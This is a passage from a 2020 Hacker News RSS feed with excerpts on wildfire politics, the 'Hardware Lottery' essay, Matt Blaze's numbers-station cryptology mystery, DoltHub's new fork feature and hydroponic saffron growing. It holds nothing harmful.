<p>Where these perspectives diverge is in terms of just who or what is responsible for changing climate. Though President Trump has used the occasion to <a href="https://www.washingtonexaminer.com/policy/energy/trump-says-world-will-start-getting-cooler-as-biden-criticizes-him-as-a-climate-arsonist" rel="noopener" target="_blank"><span>cast doubt</span></a> on the question of whether climate is changing ‚Äî something almost all of the articles reviewed for this analysis roundly agree to be the case ‚Äî the more pertinent divergence regards the degree to which human activity is responsible for the changing climate.&nbsp;</p>
<p>Articles from the political left and center are clear in the science and rationale for linking human activity, particularly the release of greenhouse gas emissions, with climate change ‚Äî a phenomenon that represents a combination of not just overall warmer temperatures but also increasing weather extremes, rising sea levels, and shifting climatic patterns. In the case of wildfires, this means some articles lay proportionally more blame on <a href="https://www.latimes.com/california/story/2020-09-13/climate-change-wildfires-california-west-coast" rel="noopener" target="_blank"><span>larger climate trends</span></a>, blaming global <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>CO2 emissions</span></a> as much as localized factors like forestry management.&nbsp;</p>
<p>‚ÄúMany of the phenomena happening now have been predicted for years by agencies like NASA, NOAA and the United Nations, as well as researchers and scientists around the world, who say the only chance of slowing climate change is cutting back or eliminating the biggest producers of greenhouse gases, including cars.‚Äù - <a href="https://weather.com/news/climate/news/2020-09-11-extreme-weather-climate-change-disasters-wildfires-flooding-hurricanes" rel="noopener" target="_blank"><span>The Weather Channel</span></a></p>
<p>Many on the political right are still hesitant to conclude that human activity is the driving force behind a changing climate, even if many acknowledge that the climate is <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>getting warmer</span></a>. As a result, much more right-leaning coverage focuses on the direct, <a href="https://reason.com/2020/09/14/western-wildfires-can-be-prevented-if-burdens-on-forest-management-are-eased/" rel="noopener" target="_blank"><span>human reasons</span></a> for the current spate of fire disasters, and <a href="https://today.yougov.com/topics/science/articles-reports/2020/09/15/what-americans-think-about-wildfires-and-climate-c" rel="noopener" target="_blank"><span>roughly half</span></a> of Republicans may think that climate change has not played a role in the current fires.&nbsp;</p>
<p>Ideally, we could better isolate each variable to say how much human movement into forests is responsible for fires and how much is due to a warmer climate, but this is hard to parse from overall trends. For example, across the U.S. we built as many as <a href="https://www.mdpi.com/2571-6255/3/3/50/htm" rel="noopener" target="_blank"><span>32 million homes</span></a> between 1990 and 2015 in the wildland-urban interface ‚Äî areas where the wildlands intermix with human development ‚Äî many of which are at increased fire risk. At the same time, fires near Portland are burning forest that has historically been too wet to pose a significant hazard to long-standing neighborhoods.&nbsp;</p>
<p>‚ÄúWhat‚Äôs different this time is that exceptionally dry conditions, combined with unusually strong and hot east winds, have caused wildfires to spiral out of control, threatening neighborhoods that didn‚Äôt seem vulnerable until now.‚Äù - <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>New York Times</span></a></p>
<div><p>A positive perspective on the issue might note that both sides, despite clear and vocal differences, actually agree that human activity and behavior make up many of the key reasons for these apocalyptic conditions.</p></div>
<h4><strong>Moving Forward</strong></h4>
<p>As <a href="https://www.chicagotribune.com/weather/ct-weather-smoke-fires-gray-sky-20200914-kpmxe2i2gjhahocfpd7zwovqt4-story.html" rel="noopener" target="_blank"><span>smoke wafts</span></a> across the U.S., there may be greater impetus to drive higher-level reform to address these growing issues. There are many reforms that both sides can agree on. Above all, we need to <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>modify land management practices</span></a> and divert more resources to both fire response and prevention. For example, as the risk of fire has increased, funding that should be used for fire prevention has been shifted to firefighting. Cumbersome regulatory hurdles have slowed the implementation of controlled burns, and private landowners <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>can still reject</span></a> such preventative action, often fearful of <a href="http://sacbee.com/news/california/article239475468.html" rel="noopener" target="_blank"><span>liability</span></a>. Measures like <a href="https://slate.com/business/2018/11/california-houses-rebuild-camp-fire-design.html" rel="noopener" target="_blank"><span>increasingly fire-proof</span></a> homes can help, but only go so far.</p>
<p>‚ÄúForest Service spending on fire suppression in recent years has gone from 15 percent of the budget to 55 percent ‚Äì or maybe even more ‚Äì which means we have to keep borrowing from funds that are intended for forest management.‚Äù - <a href="https://www.usda.gov/media/press-releases/2017/09/14/forest-service-wildland-fire-suppression-costs-exceed-2-billion" rel="noopener" target="_blank"><span>Secretary of Agriculture Sonny Purdue</span></a></p>
<p>Below this common ground, larger disagreements promise to persist, especially about climate change and its role in the current conflagrations. A host of policy actions that the political left targets, such as reducing ‚Ä¶</p></span></p></div></div></div></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.thefactual.com/climate-change-wildfires-oregon-california">https://blog.thefactual.com/climate-change-wildfires-oregon-california</a></em></p>]]>
            </description>
            <link>https://blog.thefactual.com/climate-change-wildfires-oregon-california</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521994</guid>
            <pubDate>Fri, 18 Sep 2020 21:21:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hardware Lottery]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521983">thread link</a>) | @bnjemian
<br/>
September 18, 2020 | Https://arxiv.org/abs/2009.06489 | <a href="https://web.archive.org/web/*/Https://arxiv.org/abs/2009.06489">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      
      <div id="content">
        <!--
rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns:dc="http://purl.org/dc/elements/1.1/"
         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
    <rdf:Description
        rdf:about="/abs/2009.06489"
        dc:identifier="/abs/2009.06489"
        dc:title="The Hardware Lottery"
        trackback:ping="/trackback/2009.06489" />
    </rdf:RDF>
-->
<div id="abs-outer">
  

  <div>
    

    <p><strong>arXiv:2009.06489</strong> (cs)
    </p>
    



<div id="content-inner">
  <div id="abs">
    <p>
  
  
  
    
  
  
    
    
  

  [Submitted on 14 Sep 2020]</p>
    
    
      
    
  
    <p><a href="https://arxiv.org/pdf/2009.06489">Download PDF</a></p><blockquote>
      <span>Abstract:</span>  Hardware, systems and algorithms research communities have historically had
different incentive structures and fluctuating motivation to engage with each
other explicitly. This historical treatment is odd given that hardware and
software have frequently determined which research ideas succeed (and fail).
This essay introduces the term hardware lottery to describe when a research
idea wins because it is suited to the available software and hardware and not
because the idea is superior to alternative research directions. Examples from
early computer science history illustrate how hardware lotteries can delay
research progress by casting successful ideas as failures. These lessons are
particularly salient given the advent of domain specialized hardware which
makes it increasingly costly to stray off of the beaten path of research ideas.

    </blockquote>

    <!--CONTEXT-->
    <div>
      <table summary="Additional metadata"><tbody><tr>
          <td>Subjects:</td>
          <td>
            <span>Computers and Society (cs.CY)</span>; Artificial Intelligence (cs.AI); Hardware Architecture (cs.AR); Machine Learning (cs.LG)</td>
        </tr><tr>
          <td>Cite as:</td>
          <td><span><a href="https://arxiv.org/abs/2009.06489">arXiv:2009.06489</a> [cs.CY]</span></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td>(or <span>
              <a href="https://arxiv.org/abs/2009.06489v1">arXiv:2009.06489v1</a> [cs.CY]</span> for this version)
          </td>
        </tr>
      </tbody></table>
    </div>
  </div>
</div>

    <div>
      <h2>Submission history</h2><p> From: Sara Hooker [<a href="https://arxiv.org/show-email/37378193/2009.06489">view email</a>]
      <br><strong>[v1]</strong>
Mon, 14 Sep 2020 14:49:10 UTC (4,498 KB)<br></p></div>
  </div>
  <!--end leftcolumn-->

  <div>
    
    <!--end full-text-->
    <div><p>
    Current browse context: </p><p>cs.CY</p>

  
  
    </div>

    

    
  </div>
  <!--end extra-services-->


  
  
  
  

  
</div>

      </div>
    </div></div>]]>
            </description>
            <link>Https://arxiv.org/abs/2009.06489</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521983</guid>
            <pubDate>Fri, 18 Sep 2020 21:20:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cryptologic Mystery]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24521801">thread link</a>) | @homarp
<br/>
September 18, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenƒáion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521801</guid>
            <pubDate>Fri, 18 Sep 2020 20:55:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dolt releases forks to become a real open data collaboration platform]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521536">thread link</a>) | @bheni
<br/>
September 18, 2020 | https://www.dolthub.com/blog/2020-09-18-introducing-forks/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-09-18-introducing-forks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p>Today, <a href="https://dolthub.com/">DoltHub</a> released forks. It is the same system that Github uses for collaboration on over
100 million repositories contributed to by their 40+ million users.  For the first time there is a general platform
for data collaboration, and we hope it moves open data to the next level.</p>

<p>When we started this company in August 2018 something that excited us was expanding the types of businesses that you
could start, and succeed at.  In many of the spaces today, it is difficult to come in and compete with the large players
simply because they have huge amounts of data that isn't available publicly.</p>
<p>As an example, Google launched "Google Maps" in 2005 and has heavily invested in that space since then.  It had offered
an API freely until 2012 when it began charging.  If you want to come in and compete with Google Maps you will need data
that is at least as good or better than Google's.  You can pay Google for access to their data, but at that point
you are paying to make their data better, and the gap between the data that you have, and the data that they have widens.  You
could spend the money to acquire that data, but the cost of acquiring it is beyond the budget of any startup.
So the only way to compete is with the help of others. <a href="https://www.openstreetmap.org/#map=5/38.007/-95.844">Open Street Maps</a>
is an open data project with hundreds of contributors which is being used and contributed to by companies such as Apple, Faceebook,
Foursquare, Mapbox, MapQuest, Tesla, Wikipedia and Snapchat.</p>
<p>Projects such as <a href="https://wikipedia.com/">Wikipedia</a>, other <a href="https://wikimedia.org/">Wikimedia projects</a>, and
<a href="https://www.openstreetmap.org/#map=5/38.007/-95.844">Open Street Maps</a> have shown the power of community collaboration
on data. However, there hasn't ever been a platform that made collaborating on data feasible.</p>

<p>As obvious as the benefits of data collaboration are, there are very few successful collaborative data projects.  The ones
that have been successful created platforms for getting data mainlined using specialized processes for
editing, merging, and handling conflicts that are specific to their data. </p>
<p>Though not a data product, I'll also be looking at how Git/Github approached these problems in order to
become the largest collaborative coding platform in the world, and how this approach can be used to provide a general
purpose collaborative data platform, and how Dolt/Dolthub extend that to data.</p>
<h2>Merging and Conflicts</h2>
<p>Any time you have multiple editors working on something together, merging and conflicts are a problem.  Whether it's
people collaboratively editing a document online, working on source code managed by some version control system, or
editing data in a database there is always the potential for two or more users to be modifying the same data.</p>
<p>There are different strategies for dealing with this employed by different systems. A simple solution is to just allow
the last write to win.  Some systems might force manual merges, while others may have complex domain-specific rules for
completely automated merges.  Git and Dolt attempt to automatically merge multiple edits into one, and force manual
resolution when item cannot be merged without conflict. Dolt takes it a step further by allowing you to analyze
the differences, and conflicts via SQL, and then lets you write SQL to resolve them.  </p>
<h2>Data Quality and Trust</h2>
<p>Any time you are working on a project that is open to the world, you will have to deal with bad actors.  <a href="https://www.calvertjournal.com/articles/show/2967/wikipedia-russian-government-edits">Some have
bad intentions</a>, others
are <a href="https://www.boredpanda.com/funny-wikipedia-edits/">just having a laugh</a>, and others may be adding incorrect
data unintentionally.</p>
<p>Different moderation strategies can be employed each with their own strengths and weaknesses.  Automated moderation systems
can detect some types of data errors quickly, but they can take a lot of work to train and tune in order to have a
good hit rate for erroneous changes. User based moderation systems give control to community members, and they are easy
and low cost to deploy, but their success is highly variable depending on the abilities of the moderators.</p>
<p>GitHub and DoltHub organize their projects into repositories, and grant users different privileges.  Users
may be given write access to the project by one of its owners.  These users are trusted by the project to maintain
data quality and may make changes to the data directly. In GitHub, untrusted users may fork the data, and submit changes
back to the main dataset via a "Pull Request". <em>As of today, you can do that on DoltHub too</em> <a href="#introducing-dolthub-forks-and-cross-fork-pull-requests">(Details below)</a>. </p>
<h2>Community Disagreement and Ownership</h2>
<p>Even when you have a good moderation system, datasets evolve, and disagreements can arise.  As an example, In 2007 Open
Street Maps had an <a href="https://en.wikipedia.org/wiki/Wikipedia:Edit_warring">"edit war"</a>
over the language that should be used for locations in Turkish controlled Northern Cypress.  Wikipedia keeps a page
dedicated to the <a href="https://en.wikipedia.org/wiki/Wikipedia:Lamest_edit_wars">lamest edit wars</a> seen on their platform. Other
types of disputes could be simple disputes over schema, or formatting.</p>
<p>GitHub, and now DoltHub handle this with forks. In the event that you do not like the direction that a project is going
you can always fork the project, and take it in your own direction, and you can still continue to integrate changes
from the project that you forked from.  Additionally, you can still send PRs to get your changes pushed back onto the
project you forked from.  You can continue to collaborate with the entire community, even after you have taken your
version of the project in another direction. One major example of a successful fork is MariaDB. In 2009 MySQL was forked
after a couple of acquisitions left concerns about MySQL as an open source project. Today MariaDB is a thriving
project, with a robust community.</p>

<p>Today <a href="https://dolthub.com/">Dolthub</a> is launching forks, and it is a leap forward for collaborative data projects. This
is the first solution for open data collaboration which addresses all these problems in a generalized way.  </p>
<h2>What is a Fork</h2>
<p>A fork is a copy of the data which you become the owner of.  You control who can modify your data, and those users determine
what data gets merged.  You can continue to pull changes from the repository that you forked from, and you can submit
pull requests (PRs) back to it.  You can use it as a tool to get your changes onto a repository, or you can use it to
take that repository in a different direction.</p>
<h2>What is a Pull Request</h2>
<p>A pull request or PR is a request sent to the contributors of a repository to merge your changes into their repository. It
will encapsulate all the changes that were made between the first common ancestor of the source of your repository, and
the destination branch of the repository you are submitting to. Owners of the pull request's destination repository can
then review and integrate these changes into their repository.</p>

<p>At the end of july I wrote <a href="https://www.dolthub.com/blog/2020-07-29-scraping-linkedin/">an article about Open Resumes</a>,
where I talked about the motivations for scraping linked in, and the desire for an
<a href="https://www.dolthub.com/repositories/Liquidata/open-resumes/">Open Resumes</a> dataset. With the arrival of forks I invite
you to fork the dataset, and send us a pull request containing your scraped LinkedIn resume.  More than anything, our goal
here is to show off Dolt/DoltHub as a data collaboration platform. </p>

<p>With today's release we feel we are a step closer to being the platform that we envisioned in 2018.  We have built the most
important features of a collaborative data platform. We will continue to develop features to this end which will improve
the experience, but the next step is to get people to start collaborating on data on the platform. We are getting ready
to put our money where our mouth is.  Stay tuned for some announcements that could make you real money collaborating on
some of our datasets.</p></div></div>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-09-18-introducing-forks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521536</guid>
            <pubDate>Fri, 18 Sep 2020 20:26:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Growing Saffron Hydroponically: A Guide]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521329">thread link</a>) | @jelliclesfarm
<br/>
September 18, 2020 | https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide | <a href="https://web.archive.org/web/*/https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><img width="696" height="522" src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-300x225.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-768x576.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-80x60.jpg 80w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-265x198.jpg 265w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-560x420.jpg 560w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="Growing Saffron Hydroponically." title="Growing Saffron Hydroponically." data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20696%20522'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-300x225.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-768x576.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-80x60.jpg 80w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-265x198.jpg 265w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-560x420.jpg 560w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720.jpg 800w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg"><figcaption>Growing Saffron Hydroponically.</figcaption></figure></div>
            <!-- content --><h3><span id="A_step_by_step_guide_for_growing_hydroponic_saffron"><strong><u>A step by step guide for growing hydroponic saffron</u></strong></span>
</h3>
<p>Today, we discuss the topic of growing saffron hydroponically, hydroponic saffron plant care, hydroponic saffron bulb germination, harvesting procedure of hydroponic saffron, hydroponic nutrient solution, fertilizer for the saffron plants, and suitable hydroponic <a data-ail="1844" target="_self" href="https://gardeningtips.in/nft-hydroponics-system-building-requirements">NFT</a> (Nutrient film technique), DWC (Deepwater culture) system for growing saffron.</p>
<p>Hello, dear readers today we are back again with something more interesting and valuable for you. What if I say I have the formula to make you rich that too simply by gardening at your home only! The plant today we will be discussing is no less than a treasure, I hope all you are aware of the world√¢‚Ç¨‚Ñ¢s most expensive spice!!</p>

<p>Yes, friends, we will be talking about <strong><u>how to grow saffron</u></strong> in a <a data-ail="1844" target="_self" href="https://gardeningtips.in/starting-hydroponics-gardening-at-home">hydroponics</a> system. Saffron: strands of gold a spice that costs more by weight than the gold. However, since we can√¢‚Ç¨‚Ñ¢t grow gold, saffron might be the next best thing.</p>
<h4><span id="Growing_saffron_bulbs_hydroponically"><strong><u>Growing saffron bulbs hydroponically</u></strong></span>
</h4>
<p>The saffron crocus (<em>Crocus sativus L.)</em> is propagated from a small rounded corm (very much similar to a bulb). Authentic Saffron spice comes from the stigma of the Saffron corm flower. The corm is basically the bulb from which the Saffron is grown it is a rounded tuber that gives rise to up to three flowers. The corms are purchased when they are in the dormant stage, and plant in late summer or early fall when they quickly burst into life with the production of small crocus flowers.</p>
<p>This exotic spice is the dried thread like red-gold colored stigma which is formed inside the beautiful blue/purple flower. Each flower produces on an average of three stigmas which give three strands of saffron. After flowering, the plant resumes its vegetative growth of thin, dark green strap-like leaves and then multiplies itself. It takes approximately a pound of fresh flowers to yield an ounce of stigmas. Once the stigmas are dried to produce the spice, it loses about 75 √¢‚Ç¨‚Äú 80% of its mass and considerable weight leaving you with very little spice, which is one very solid reason the price is so very expensive. Furthermore, in addition to its culinary uses, Saffron has also demanded it is pharmaceutical, cosmetic, and industrial applications.</p>

<p>You may also like <a data-mil="1844" href="https://gardeningtips.in/growing-stevia-hydroponically-from-seed-a-full-guide"><span><strong>Growing Stevia Hydroponically from Seed</strong></span></a>.</p>
<p>Saffron is a tough crop to grow and maintain but far from impossible. In fact, probably <strong><u>saffron spice grown hydroponically</u></strong> is easy to grow and maintain than it would be conventional. The bulbs or corms are the propagating material and can be easily obtained from stores for <strong><u>growing saffron indoors for profit</u></strong> as well.</p>
<p>When buying corms for the first time, it is important to know that like many flowering bulbs, the corms come in different size grades from very small (0.6 grams) which would be a non-flowering type requiring an extra season√¢‚Ç¨‚Ñ¢s growth, to very large (24 grams).</p>

<p>The smaller corms are usually less expensive, but they may not produce flowers in the first season or gives a much lower yield of saffron and a lower number of daughter corms after flowering. The top planting grade for hydroponics is around 15 grams which are generally over an inch in diameter. The corms turn up dry in a dormant state ready for planting out.</p>
<p>In an indoor Hydroponic system, they can be planted throughout the year as you are determining and manipulating their growing environment affecting <strong><u>the growth of saffron</u></strong> even this is followed in the <strong><u>hydroponic flower farm</u></strong>.</p>
<p>The corms can be planted, flowered, and harvested in approximately 45-day cycles. At the completion of each cycle, you will have to start again with new corms or wait for the existing ones to go through their vegetative and dormancy phases before re-flowering and multiplying again.</p>
<h4><span id="The_dormancy_of_saffron_plants"><strong>The dormancy of saffron plants</strong></span>
</h4>
<figure id="attachment_1846" aria-describedby="caption-attachment-1846"><img src="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg" alt="Saffron Plants." width="800" height="531" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-300x199.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-768x510.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-696x462.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-633x420.jpg 633w" sizes="(max-width: 800px) 100vw, 800px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20531'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-300x199.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-768x510.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-696x462.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-633x420.jpg 633w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg"><figcaption id="caption-attachment-1846">Saffron Plants.</figcaption></figure><p>The non-productive vegetative and dormancy phase takes approximately about nine months, so starting with new corms for each growth cycle is actually the most cost-effective way.</p>
<p>You may be interested in <a data-mil="1844" href="https://gardeningtips.in/growing-hydroponic-bitter-gourd-from-seed"><span><strong>Growing Hydroponic Bitter Gourd from Seed</strong></span></a>.</p>

